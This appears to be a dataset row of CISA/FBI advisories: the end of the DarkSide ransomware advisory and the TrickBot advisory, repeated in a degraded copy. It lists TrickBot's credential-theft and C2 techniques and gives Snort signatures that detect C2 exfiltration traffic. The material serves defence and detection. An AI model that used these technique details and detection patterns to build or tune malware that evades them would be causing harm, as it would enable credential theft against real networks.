Store your backups separately. Backups should be isolated from network connections that could enable the spread of ransomware. It is important that backups be maintained offline as many ransomware variants attempt to find and encrypt or delete accessible backups. Maintaining current backups offline is critical because if your network data is encrypted with ransomware, your organization can restore systems to its previous state. Best practice is to store your backups on a separate device that cannot be accessed from a network, such as on an external hard drive. (See the Software Engineering Institute’s page on ransomware).
Maintain regularly updated “gold images” of critical systems in the event they need to be rebuilt. This entails maintaining image “templates” that include a preconfigured operating system (OS) and associated software applications that can be quickly deployed to rebuild a system, such as a virtual machine or server.
Retain backup hardware to rebuild systems in the event rebuilding the primary system is not preferred. Hardware that is newer or older than the primary system can present installation or compatibility hurdles when rebuilding from images.
Store source code or executables. It is more efficient to rebuild from system images, but some images will not install on different hardware or platforms correctly; having separate access to needed software will help in these cases.


Ensure user and process accounts are limited through account use policies, user account control, and privileged account management. Organize access rights based on the principles of least privilege and separation of duties.

If your organization is impacted by a ransomware incident, CISA and FBI recommend the following actions:

Isolate the infected system. Remove the infected system from all networks, and disable the computer’s wireless, Bluetooth, and any other potential networking capabilities. Ensure all shared and networked drives are disconnected, whether wired or wireless.  
Turn off other computers and devices. Power-off and segregate (i.e., remove from the network) the infected computer(s). Power-off and segregate any other computers or devices that shared a network with the infected computer(s) that have not been fully encrypted by ransomware. If possible, collect and secure all infected and potentially infected computers and devices in a central location, making sure to clearly label any computers that have been encrypted. Powering-off and segregating infected computers and computers that have not been fully encrypted may allow for the recovery of partially encrypted files by specialists. (See Before You Connect a New Computer to the Internet for tips on how to make a computer more secure before you reconnect it to a network.)
Secure your backups. Ensure that your backup data is offline and secure. If possible, scan your backup data with an antivirus program to check that it is free of malware.
Refer to Joint Cybersecurity Advisory: AA20-245A: Technical Approaches to Uncovering and Remediating Malicious Activity for more best practices on incident response.

Note: CISA and the FBI do not encourage paying a ransom to criminal actors. Paying a ransom may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or may fund illicit activities. Paying the ransom also does not guarantee that a victim’s files will be recovered. CISA and FBI urge you to report ransomware incidents to your local FBI field office.
CISA offers a range of no-cost cyber hygiene services to help CI organizations assess, identify and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.
Resources

CISA and MS-ISAC: Joint Ransomware Guide
CISA: Ransomware page
CISA Tip: Protecting Against Ransomware
CISA: CISA Ransomware One-Pager and Technical Document
CISA Insights: Ransomware Outbreak
CISA: Pipeline Cybersecurity Initiative
CISA Webinar: Combating Ransomware
CISA: Cybersecurity Practices for Industrial Control Systems
FBI: Incidents of Ransomware on the Rise
National Security Agency (NSA): Stop Malicious Cyber Activity Against Connected Operational Technology
Department of Energy: Oil and Natural Gas Subsector Cybersecurity Capability Maturity Model
Transportation Security Agency: Pipeline Security Guidelines
National Institute of Standards and Technology (NIST): Framework for Improving Critical Infrastructure Cybersecurity
NIST: Ransomware Protection and Response
NIST: Data Integrity: Identifying and Protecting Assets Against Ransomware and Other Destructive Events
NIST: Data Integrity: Detecting and Responding to Ransomware and Other Destructive Events
NIST: Data Integrity: Recovering from Ransomware and Other Destructive Events
NIST: Guide to Industrial Control Systems (ICS) Security
Software Engineering Institute: Ransomware: Best Practices for Prevention and Response
NIST Fact Sheet: How Do I Stay Prepared?


Contact Information

Victims of ransomware should report it immediately to CISA at https://us-cert.cisa.gov/report, a local FBI Field Office, or U.S. Secret Service Field Office. To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at central@cisa.dhs.gov.

References,1, Colonial Pipeline Media Statement on Pipeline Disruption,2, Ibid,3, SonicWall: Darkside Ransomware Targets Large Corporations. Charges up to $2M.,4, Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign,5, BankInfo Security: FBI: DarkSide Ransomware Used in Colonial Pipeline Attack,6, Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign,7, Ibid,8, SonicWall: Darkside Ransomware Targets Large Corporations. Charges up to $2M,9, Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign,10, McAfee: Threat Landscape Dashboard DarkSide – Ransomware,11, SonicWall: Darkside Ransomware Targets Large Corporations. Charges up to $2M,12, Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign,13, McAfee: Threat Landscape Dashboard DarkSide – Ransomware

Revisions

May 11, 2021: Initial Version|May 12, 2021: Added additional resources|May 19, 2021: Added IOCs|July 8, 2021: Added MAR-10337802-1.v1 and associated IOCs






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-131a
66,"




Summary

This Joint Cybersecurity Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Version 8. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) have observed continued targeting through spearphishing campaigns using TrickBot malware in North America. A sophisticated group of cybercrime actors is luring victims, via phishing emails, with a traffic infringement phishing scheme to download TrickBot.
TrickBot—first identified in 2016—is a Trojan developed and operated by a sophisticated group of cybercrime actors. Originally designed as a banking Trojan to steal financial data, TrickBot has evolved into highly modular, multi-stage malware that provides its operators a full suite of tools to conduct a myriad of illegal cyber activities.
To secure against TrickBot, CISA and FBI recommend implementing the mitigation measures described in this Joint Cybersecurity Advisory, which include blocking suspicious Internet Protocol addresses, using antivirus software, and providing social engineering and phishing training to employees.
Click here for a PDF version of this report.

Technical Details

TrickBot is an advanced Trojan that malicious actors spread primarily by spearphishing campaigns using tailored emails that contain malicious attachments or links, which—if enabled—execute malware (Phishing: Spearphishing Attachment [T1566.001], Phishing: Spearphishing Link [T1566.002]). CISA and FBI are aware of recent attacks that use phishing emails, claiming to contain proof of a traffic violation, to steal sensitive information. The phishing emails contain links that redirect to a website hosted on a compromised server that prompts the victim to click on photo proof of their traffic violation. (User Execution: Malicious Link [T1204.001], User Execution: Malicious File [T1204.002]). In clicking the photo, the victim unknowingly downloads a malicious JavaScript file that, when opened, automatically communicates with the malicious actor’s command and control (C2) server to download TrickBot to the victim’s system (Command and Scripting Interpreter: JavaScript [T1059.007]).
Attackers can use TrickBot to:

Drop other malware, such as Ryuk and Conti ransomware, or
Serve as an Emotet downloader (Ingress Tool Transfer [T1105]).[1]

TrickBot uses person-in-the-browser attacks to steal information, such as login credentials (Man in the Browser [T1185]). Additionally, some of TrickBot’s modules spread the malware laterally across a network by abusing the Server Message Block (SMB) Protocol. TrickBot operators have a toolset capable of spanning the entirety of the MITRE ATT&CK framework, from actively or passively gathering information that can be used to support targeting (Reconnaissance [TA0043]), to trying to manipulate, interrupt, or destroy systems and data (Impact [TA0040]).
TrickBot is capable of data exfiltration over a hardcoded C2 server, cryptomining, and host enumeration (e.g., reconnaissance of Unified Extensible Firmware Interface or Basic Input/Output System [UEFI/BIOS] firmware) (Exfiltration Over C2 Channel [T1041], Resource Hijacking [T1496], System Information Discovery.[2] For host enumeration, operators deliver TrickBot in modules containing a configuration file with specific tasks.
Figure 1 lays out TrickBot’s use of enterprise techniques.

Figure 1: MITRE ATT&CK enterprise techniques used by TrickBot 
 
MITRE ATT&CK Techniques
According to MITRE, TrickBot [S0266] uses the ATT&CK techniques listed in table 1.
Table 1: TrickBot ATT&CK techniques for enterprise
Initial Access [TA0001]




Technique Title

ID
Use




Phishing: Spearphishing Attachment
T1566.001
TrickBot has used an email with an Excel sheet containing a malicious macro to deploy the malware.


Phishing: Spearphishing Link
T1566.002

TrickBot has been delivered via malicious links in phishing emails.




Execution [TA0002]



Technique Title
ID
Use




Scheduled Task/Job: Scheduled Task
T1053.005
TrickBot creates a scheduled task on the system that provides persistence.


Command and Scripting Interpreter: Windows Command Shell
T1059.003
TrickBot has used macros in Excel documents to download and deploy the malware on the user’s machine.


Command and Scripting Interpreter: JavaScript/JScript
T1059.007
TrickBot victims unknowingly download a malicious JavaScript file that, when opened, automatically communicates with the malicious actor’s C2 server to download TrickBot to the victim’s system.


Native API
T1106
TrickBot uses the Windows Application Programming Interface (API) call, CreateProcessW(), to manage execution flow.


User Execution: Malicious Link
T1204.001
TrickBot has sent spearphishing emails in an attempt to lure users to click on a malicious link.


User Execution: Malicious File
T1204.002
TrickBot has attempted to get users to launch malicious documents to deliver its payload.



Persistence [TA0003]



Technique Title
ID
Use




Scheduled Task/Job: Scheduled Task
T1053.005
TrickBot creates a scheduled task on the system that provides persistence.


Create or Modify System Process: Windows Service
T1543.003
TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.



Privilege Escalation [TA0004]



Technique Title
ID
Use




Scheduled Task/Job: Scheduled Task
T1053.005
TrickBot creates a scheduled task on the system that provides persistence.


Process Injection: Process Hollowing
T1055.012
TrickBot injects into the svchost.exe process.


Create or Modify System Process: Windows Service
T1543.003
TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.



 Defense Evasion [TA0005]



Technique Title
ID
Use




Obfuscated Files or Information
T1027
TrickBot uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.


Obfuscated Files or Information: Software Packing
T1027.002
TrickBot leverages a custom packer to obfuscate its functionality.


Masquerading
T1036
The TrickBot downloader has used an icon to appear as a Microsoft Word document.


Process Injection: Process Hollowing
T1055.012
TrickBot injects into the svchost.exe process.


Modify Registry
T1112
TrickBot can modify registry entries.


Deobfuscate/Decode Files or Information 
T1140
TrickBot decodes the configuration data and modules.


Subvert Trust Controls: Code Signing
T1553.002
TrickBot has come with a signed downloader component.


Impair Defenses: Disable or Modify Tools
T1562.001
TrickBot can disable Windows Defender.



Credential Access [TA0006]



Technique Title
ID
Use




Input Capture: Credential API Hooking
T1056.004
TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API.


Unsecured Credentials: Credentials in Files
T1552.001
TrickBot can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP. Additionally, it searches for the .vnc.lnk affix to steal VNC credentials.


Unsecured Credentials: Credentials in Registry
T1552.002
TrickBot has retrieved PuTTY credentials by querying the Software\SimonTatham\Putty\Sessions registry key.


Credentials from Password Stores
T1555
TrickBot can steal passwords from the KeePass open-source password manager.


Credentials from Password Stores: Credentials from Web Browsers
T1555.003
TrickBot can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl.



Discovery [TA0007]



Technique Tactic
ID
Use




System Service Discovery
T1007
TrickBot collects a list of install programs and services on the system’s machine.


System Network Configuration Discovery
T1016
TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine.


Remote System Discovery
T1018
TrickBot can enumerate computers and network devices.


System Owner/User Discovery
T1033
TrickBot can identify the user and groups the user belongs to on a compromised host.


Permission Groups Discovery
T1069
TrickBot can identify the groups the user on a compromised host belongs to.


System Information Discovery
T1082
TrickBot gathers the OS version, machine name, CPU type, amount of RAM available from the victim’s machine.


File and Directory Discovery
T1083
TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information.


Account Discovery: Local Account 
T1087.001
TrickBot collects the users of the system.


Account Discovery: Email Account
T1087.003
TrickBot collects email addresses from Outlook.


Domain Trust Discovery
T1482
TrickBot can gather information about domain trusts by utilizing Nltest.



Lateral Movement [TA0008]



Technique Tactic
ID
Use




Lateral Tool Transfer
T1570
Some TrickBot modules spread the malware laterally across a network by abusing the SMB Protocol.



Collection [TA0009]



Technique Tactic 
ID
Use




Data from Local System
T1005
TrickBot collects local files and information from the victim’s local machine.


Input Capture:Credential API Hooking
T1056.004
TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API.


Person in the Browser
T1185
TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified webpage.



Command and Control [TA0011]



Technique Tactic 
ID
Use




Fallback Channels
T1008
TrickBot can use secondary command and control (C2) servers for communication after establishing connectivity and relaying victim information to primary C2 servers.


Application Layer Protocol: Web Protocols
T1071.001
TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.


Ingress Tool Transfer
T1105
TrickBot downloads several additional files and saves them to the victim's machine.


Data Encoding: Standard Encoding
T1132.001
TrickBot can Base64-encode C2 commands.


Non-Standard Port
T1571
Some TrickBot samples have used HTTP over ports 447 and 8082 for C2.


Encrypted Channel: Symmetric Cryptography
T1573.001
TrickBot uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.



Exfiltration [TA0010]



Technique Tactic
ID
Use




Exfiltration Over C2 Channel
T1041
TrickBot can send information about the compromised host to a hardcoded C2 server.



Impact [TA0040]



Technique Tactic
ID
Use




Resource Hijacking
T1496
TrickBot actors can leverage the resources of co-opted systems for cryptomining to validate transactions of cryptocurrency networks and earn virtual currency.



Detection
Signatures
CISA developed the following snort signature for use in detecting network activity associated with TrickBot activity.
 
alert tcp any [443,447] -> any any (msg:""TRICKBOT:SSL/TLS Server X.509 Cert Field contains 'example.com' (Hex)""; sid:1; rev:1; flow:established,from_server; ssl_state:server_hello; content:""|0b|example.com""; fast_pattern:only; content:""Global Security""; content:""IT Department""; pcre:""/(?:\x09\x00\xc0\xb9\x3b\x93\x72\xa3\xf6\xd2|\x00\xe2\x08\xff\xfb\x7b\x53\x76\x3d)/""; classtype:bad-unknown; metadata:service ssl,service and-ports;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""TRICKBOT_ANCHOR:HTTP URI GET contains '/anchor'""; sid:1; rev:1; flow:established,to_server; content:""/anchor""; http_uri; fast_pattern:only; content:""GET""; nocase; http_method; pcre:""/^\/anchor_?.{3}\/[\w_-]+\.[A-F0-9]+\/?$/U""; classtype:bad-unknown; priority:1; metadata:service http;)
 
alert tcp any $SSL_PORTS -> any any (msg:""TRICKBOT:SSL/TLS Server X.509 Cert Field contains 'C=XX, L=Default City, O=Default Company Ltd'""; sid:1; rev:1; flow:established,from_server; ssl_state:server_hello; content:""|31 0b 30 09 06 03 55 04 06 13 02|XX""; nocase; content:""|31 15 30 13 06 03 55 04 07 13 0c|Default City""; nocase; content:""|31 1c 30 1a 06 03 55 04 0a 13 13|Default Company Ltd""; nocase; content:!""|31 0c 30 0a 06 03 55 04 03|""; classtype:bad-unknown; reference:url,www.virustotal.com/gui/file/e9600404ecc42cf86d38deedef94068db39b7a0fd06b3b8fb2d8a3c7002b650e/detection; metadata:service ssl;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""TRICKBOT:HTTP Client Header contains 'boundary=Arasfjasu7'""; sid:1; rev:1; flow:established,to_server; content:""boundary=Arasfjasu7|0d 0a|""; http_header; content:""name=|22|proclist|22|""; http_header; content:!""Referer""; content:!""Accept""; content:""POST""; http_method; classtype:bad-unknown; metadata:service http;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""TRICKBOT:HTTP Client Header contains 'User-Agent|3a 20|WinHTTP loader/1.'""; sid:1; rev:1; flow:established,to_server; content:""User-Agent|3a 20|WinHTTP loader/1.""; http_header; fast_pattern:only; content:"".png|20|HTTP/1.""; pcre:""/^Host\x3a\x20(?:\d{1,3}\.){3}\d{1,3}(?:\x3a\d{2,5})?$/mH""; content:!""Accept""; http_header; content:!""Referer|3a 20|""; http_header; classtype:bad-unknown; metadata:service http;)
 
alert tcp any $HTTP_PORTS -> any any (msg:""TRICKBOT:HTTP Server Header contains 'Server|3a 20|Cowboy'""; sid:1; rev:1; flow:established,from_server; content:""200""; http_stat_code; content:""Server|3a 20|Cowboy|0d 0a|""; http_header; fast_pattern; content:""content-length|3a 20|3|0d 0a|""; http_header; file_data; content:""/1/""; depth:3; isdataat:!1,relative; classtype:bad-unknown; metadata:service http;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""TRICKBOT:HTTP URI POST contains C2 Exfil""; sid:1; rev:1; flow:established,to_server; content:""Content-Type|3a 20|multipart/form-data|3b 20|boundary=------Boundary""; http_header; fast_pattern; content:""User-Agent|3a 20|""; http_header; distance:0; content:""Content-Length|3a 20|""; http_header; distance:0; content:""POST""; http_method; pcre:""/^\/[a-z]{3}\d{3}\/.+?\.[A-F0-9]{32}\/\d{1,3}\//U""; pcre:""/^Host\x3a\x20(?:\d{1,3}\.){3}\d{1,3}$/mH""; content:!""Referer|3a|""; http_header; classtype:bad-unknown; metadata:service http;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""HTTP URI GET/POST contains '/56evcxv' (Trickbot)""; sid:1; rev:1; flow:established,to_server; content:""/56evcxv""; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)
 
alert icmp any any -> any any (msg:""TRICKBOT_ICMP_ANCHOR:ICMP traffic conatins 'hanc'""; sid:1; rev:1; itype:8; content:""hanc""; offset:4; fast_pattern; classtype:bad-unknown;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""HTTP Client Header contains POST with 'host|3a 20|*.onion.link' and 'data=' (Trickbot/Princess Ransomeware)""; sid:1; rev:1; flow:established,to_server; content:""POST""; nocase; http_method; content:""host|3a 20|""; http_header; content:"".onion.link""; nocase; http_header; distance:0; within:47; fast_pattern; file_data; content:""data=""; distance:0; within:5; classtype:bad-unknown; metadata:service http;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""HTTP Client Header contains 'host|3a 20|tpsci.com' (trickbot)""; sid:1; rev:1; flow:established,to_server; content:""host|3a 20|tpsci.com""; http_header; fast_pattern:only; classtype:bad-unknown; metadata:service http;)

Mitigations

CISA and FBI recommend that network defenders—in federal, state, local, tribal, territorial governments, and the private sector—consider applying the following best practices to strengthen the security posture of their organization's systems. System owners and administrators should review any configuration changes prior to implementation to avoid negative impacts.

Provide social engineering and phishing training to employees.
Consider drafting or updating a policy addressing suspicious emails  that specifies users must report all suspicious emails to the security and/or IT departments.
Mark external emails with a banner denoting the email is from an external source to assist users in detecting spoofed emails.
Implement Group Policy Object and firewall rules.
Implement an antivirus program and a formalized patch management process.
Implement filters at the email gateway and block suspicious IP addresses at the firewall.
Adhere to the principle of least privilege.
Implement a Domain-Based Message Authentication, Reporting & Conformance validation system.
Segment and segregate networks and functions.
Limit unnecessary lateral communications between network hoses, segments, and devices.
Consider using application allowlisting technology on all assets to ensure that only authorized software executes, and all unauthorized software is blocked from executing on assets. Ensure that such technology only allows authorized, digitally signed scripts to run on a system.
Enforce multi-factor authentication.
Enable a firewall on agency workstations configured to deny unsolicited connection requests.
Disable unnecessary services on agency workstations and servers.
Implement an Intrusion Detection System, if not already used, to detect C2 activity and other potentially malicious network activity
Monitor web traffic. Restrict user access to suspicious or risky sites.
Maintain situational awareness of the latest threats and implement appropriate access control lists.
Disable the use of SMBv1 across the network and require at least SMBv2 to harden systems against network propagation modules used by TrickBot.
Visit the MITRE ATT&CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies.
See CISA’s Alert on Technical Approaches to Uncovering and Remediating Malicious Activity for more information on addressing potential incidents and applying best practice incident response procedures.

For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, Guide to Malware Incident Prevention and Handling for Desktops and Laptops.
Resources

CISA Fact Sheet: TrickBot Malware
MS-ISAC White Paper: Security Primer – TrickBot
United Kingdom National Cyber Security Centre Advisory: Ryuk Ransomware Targeting Organisations Globally
CISA and MS-ISAC Joint Alert AA20-280A: Emotet Malware
MITRE ATT&CK for Enterprise


References

[1] FireEye Blog - A Nasty Trick: From Credential Theft Malware to Business Disruption
[2] Eclypsium Blog - TrickBot Now Offers 'TrickBoot': Persist, Brick, Profit

Revisions

March 17, 2021: Initial Version|March 24, 2021: Added MITRE ATT&CK Technique T1592.003 used for reconnaissance|May 20, 2021: Added new MITRE ATT&CKs and updated Table 1






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1041', 'TA0003', 'T1083', 'TA0008', 'T1592.003', 'T1562.001', 'T1566.002', 'T1087.003', 'T1553.002', 'T1005', 'TA0010', 'T1571', 'TA0005', 'T1573.001', 'T1204.002', 'T1555', 'T1016', 'T1482', 'TA0006', 'T1055.012', 'T1552.002', 'T1105', 'T1112', 'T1018', 'T1082', 'T1087.001', 'TA0043', 'T1069', 'T1140', 'TA0011', 'T1008', 'T1132.001', 'T1204.001', 'T1027', 'T1543.003', 'T1552.001', 'TA0001', 'T1007', 'T1566.001', 'T1570', 'TA0002', 'T1033', 'T1027.002', 'T1056.004', 'T1059.007', 'T1496', 'TA0009', 'TA0040', 'T1071.001', 'TA0004', 'T1185', 'T1106', 'T1053.005', 'T1059.003', 'TA0007', 'T1555.003', 'T1036'}","




Summary

This Joint Cybersecurity Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Version 8. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) have observed continued targeting through spearphishing campaigns using TrickBot malware in North America. A sophisticated group of cybercrime actors is luring victims, via phishing emails, with a traffic infringement phishing scheme to download TrickBot.
TrickBot—first identified in 2016—is a Trojan developed and operated by a sophisticated group of cybercrime actors. Originally designed as a banking Trojan to steal financial data, TrickBot has evolved into highly modular, multi-stage malware that provides its operators a full suite of tools to conduct a myriad of illegal cyber activities.
To secure against TrickBot, CISA and FBI recommend implementing the mitigation measures described in this Joint Cybersecurity Advisory, which include blocking suspicious Internet Protocol addresses, using antivirus software, and providing social engineering and phishing training to employees.
Click here for a PDF version of this report.

Technical Details

TrickBot is an advanced Trojan that malicious actors spread primarily by spearphishing campaigns using tailored emails that contain malicious attachments or links, which—if enabled—execute malware (Phishing: Spearphishing Attachment, Phishing: Spearphishing Link,). CISA and FBI are aware of recent attacks that use phishing emails, claiming to contain proof of a traffic violation, to steal sensitive information. The phishing emails contain links that redirect to a website hosted on a compromised server that prompts the victim to click on photo proof of their traffic violation. (User Execution: Malicious Link, User Execution: Malicious File,). In clicking the photo, the victim unknowingly downloads a malicious JavaScript file that, when opened, automatically communicates with the malicious actor’s command and control (C2) server to download TrickBot to the victim’s system (Command and Scripting Interpreter: JavaScript,).
Attackers can use TrickBot to:

Drop other malware, such as Ryuk and Conti ransomware, or
Serve as an Emotet downloader (Ingress Tool Transfer,).,1,

TrickBot uses person-in-the-browser attacks to steal information, such as login credentials (Man in the Browser,). Additionally, some of TrickBot’s modules spread the malware laterally across a network by abusing the Server Message Block (SMB) Protocol. TrickBot operators have a toolset capable of spanning the entirety of the MITRE ATT&CK framework, from actively or passively gathering information that can be used to support targeting (Reconnaissance,), to trying to manipulate, interrupt, or destroy systems and data (Impact,).
TrickBot is capable of data exfiltration over a hardcoded C2 server, cryptomining, and host enumeration (e.g., reconnaissance of Unified Extensible Firmware Interface or Basic Input/Output System,UEFI/BIOS, firmware) (Exfiltration Over C2 Channel, Resource Hijacking, System Information Discovery.,2, For host enumeration, operators deliver TrickBot in modules containing a configuration file with specific tasks.
Figure 1 lays out TrickBot’s use of enterprise techniques.

Figure 1: MITRE ATT&CK enterprise techniques used by TrickBot 
 
MITRE ATT&CK Techniques
According to MITRE, TrickBot,S0266, uses the ATT&CK techniques listed in table 1.
Table 1: TrickBot ATT&CK techniques for enterprise
Initial Access,

Execution,

Persistence,

Privilege Escalation,

 Defense Evasion,

Credential Access,

Discovery,

Lateral Movement,

Collection,

Command and Control,

Exfiltration,

Impact,

Detection
Signatures
CISA developed the following snort signature for use in detecting network activity associated with TrickBot activity.
 
alert tcp any,443,447, -> any any (msg:""TRICKBOT:SSL/TLS Server X.509 Cert Field contains 'example.com' (Hex)""; sid:1; rev:1; flow:established,from_server; ssl_state:server_hello; content:""|0b|example.com""; fast_pattern:only; content:""Global Security""; content:""IT Department""; pcre:""/(?:\x09\x00\xc0\xb9\x3b\x93\x72\xa3\xf6\xd2|\x00\xe2\x08\xff\xfb\x7b\x53\x76\x3d)/""; classtype:bad-unknown; metadata:service ssl,service and-ports;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""TRICKBOT_ANCHOR:HTTP URI GET contains '/anchor'""; sid:1; rev:1; flow:established,to_server; content:""/anchor""; http_uri; fast_pattern:only; content:""GET""; nocase; http_method; pcre:""/^\/anchor_?.{3}\/,\w_-,+\.,A-F0-9,+\/?$/U""; classtype:bad-unknown; priority:1; metadata:service http;)
 
alert tcp any $SSL_PORTS -> any any (msg:""TRICKBOT:SSL/TLS Server X.509 Cert Field contains 'C=XX, L=Default City, O=Default Company Ltd'""; sid:1; rev:1; flow:established,from_server; ssl_state:server_hello; content:""|31 0b 30 09 06 03 55 04 06 13 02|XX""; nocase; content:""|31 15 30 13 06 03 55 04 07 13 0c|Default City""; nocase; content:""|31 1c 30 1a 06 03 55 04 0a 13 13|Default Company Ltd""; nocase; content:!""|31 0c 30 0a 06 03 55 04 03|""; classtype:bad-unknown; reference:url,www.virustotal.com/gui/file/e9600404ecc42cf86d38deedef94068db39b7a0fd06b3b8fb2d8a3c7002b650e/detection; metadata:service ssl;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""TRICKBOT:HTTP Client Header contains 'boundary=Arasfjasu7'""; sid:1; rev:1; flow:established,to_server; content:""boundary=Arasfjasu7|0d 0a|""; http_header; content:""name=|22|proclist|22|""; http_header; content:!""Referer""; content:!""Accept""; content:""POST""; http_method; classtype:bad-unknown; metadata:service http;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""TRICKBOT:HTTP Client Header contains 'User-Agent|3a 20|WinHTTP loader/1.'""; sid:1; rev:1; flow:established,to_server; content:""User-Agent|3a 20|WinHTTP loader/1.""; http_header; fast_pattern:only; content:"".png|20|HTTP/1.""; pcre:""/^Host\x3a\x20(?:\d{1,3}\.){3}\d{1,3}(?:\x3a\d{2,5})?$/mH""; content:!""Accept""; http_header; content:!""Referer|3a 20|""; http_header; classtype:bad-unknown; metadata:service http;)
 
alert tcp any $HTTP_PORTS -> any any (msg:""TRICKBOT:HTTP Server Header contains 'Server|3a 20|Cowboy'""; sid:1; rev:1; flow:established,from_server; content:""200""; http_stat_code; content:""Server|3a 20|Cowboy|0d 0a|""; http_header; fast_pattern; content:""content-length|3a 20|3|0d 0a|""; http_header; file_data; content:""/1/""; depth:3; isdataat:!1,relative; classtype:bad-unknown; metadata:service http;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""TRICKBOT:HTTP URI POST contains C2 Exfil""; sid:1; rev:1; flow:established,to_server; content:""Content-Type|3a 20|multipart/form-data|3b 20|boundary=------Boundary""; http_header; fast_pattern; content:""User-Agent|3a 20|""; http_header; distance:0; content:""Content-Length|3a 20|""; http_header; distance:0; content:""POST""; http_method; pcre:""/^\/,a-z,{3}\d{3}\/.+?\.,A-F0-9,{32}\/\d{1,3}\//U""; pcre:""/^Host\x3a\x20(?:\d{1,3}\.){3}\d{1,3}$/mH""; content:!""Referer|3a|""; http_header; classtype:bad-unknown; metadata:service http;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""HTTP URI GET/POST contains '/56evcxv' (Trickbot)""; sid:1; rev:1; flow:established,to_server; content:""/56evcxv""; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)
 
alert icmp any any -> any any (msg:""TRICKBOT_ICMP_ANCHOR:ICMP traffic conatins 'hanc'""; sid:1; rev:1; itype:8; content:""hanc""; offset:4; fast_pattern; classtype:bad-unknown;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""HTTP Client Header contains POST with 'host|3a 20|*.onion.link' and 'data=' (Trickbot/Princess Ransomeware)""; sid:1; rev:1; flow:established,to_server; content:""POST""; nocase; http_method; content:""host|3a 20|""; http_header; content:"".onion.link""; nocase; http_header; distance:0; within:47; fast_pattern; file_data; content:""data=""; distance:0; within:5; classtype:bad-unknown; metadata:service http;)
 
alert tcp any any -> any $HTTP_PORTS (msg:""HTTP Client Header contains 'host|3a 20|tpsci.com' (trickbot)""; sid:1; rev:1; flow:established,to_server; content:""host|3a 20|tpsci.com""; http_header; fast_pattern:only; classtype:bad-unknown; metadata:service http;)

Mitigations

CISA and FBI recommend that network defenders—in federal, state, local, tribal, territorial governments, and the private sector—consider applying the following best practices to strengthen the security posture of their organization's systems. System owners and administrators should review any configuration changes prior to implementation to avoid negative impacts.

Provide social engineering and phishing training to employees.
Consider drafting or updating a policy addressing suspicious emails  that specifies users must report all suspicious emails to the security and/or IT departments.
Mark external emails with a banner denoting the email is from an external source to assist users in detecting spoofed emails.
Implement Group Policy Object and firewall rules.
Implement an antivirus program and a formalized patch management process.
Implement filters at the email gateway and block suspicious IP addresses at the firewall.
Adhere to the principle of least privilege.
Implement a Domain-Based Message Authentication, Reporting & Conformance validation system.
Segment and segregate networks and functions.
Limit unnecessary lateral communications between network hoses, segments, and devices.
Consider using application allowlisting technology on all assets to ensure that only authorized software executes, and all unauthorized software is blocked from executing on assets. Ensure that such technology only allows authorized, digitally signed scripts to run on a system.
Enforce multi-factor authentication.
Enable a firewall on agency workstations configured to deny unsolicited connection requests.
Disable unnecessary services on agency workstations and servers.
Implement an Intrusion Detection System, if not already used, to detect C2 activity and other potentially malicious network activity
Monitor web traffic. Restrict user access to suspicious or risky sites.
Maintain situational awareness of the latest threats and implement appropriate access control lists.
Disable the use of SMBv1 across the network and require at least SMBv2 to harden systems against network propagation modules used by TrickBot.
